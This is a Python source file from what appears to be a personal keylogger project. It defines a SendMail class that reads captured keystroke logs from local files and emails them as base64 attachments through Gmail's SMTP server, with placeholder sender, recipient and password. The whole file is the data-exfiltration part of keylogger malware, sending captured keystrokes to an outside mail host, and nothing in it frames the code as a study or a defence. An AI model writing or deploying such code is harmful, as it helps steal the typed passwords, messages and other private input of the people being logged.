import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

class SendMail:
    def send():
        fromaddr = "FROMEMAIL@gmail.com"
        toaddr = "TOEMAIL@gmail.com"

        msg = MIMEMultipart()

        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Keylogger Test output"

        body = "See attached formatted & raw data"

        msg.attach(MIMEText(body, 'plain'))

        filename = "KeyLogger Output"
        attachment = open("/Users/darren/Documents/Keylogger/keyLogFormatted.txt", "rb")
        second_file = "Raw data"
        second_attachment = open("/Users/darren/Documents/Keylogger/keyLog.txt", "rb")

        part = MIMEBase('application', 'octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        second_part = MIMEBase('application', 'octet-stream')
        second_part.set_payload((second_attachment).read())
        encoders.encode_base64(second_part)
        second_part.add_header('Content-Disposition', "attachment; filename= %s" % second_file)

        msg.attach(part)
        msg.attach(second_part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, "PASS")
        text = msg.as_string()
        server.sendmail(fromaddr, toaddr, text)
        server.quit()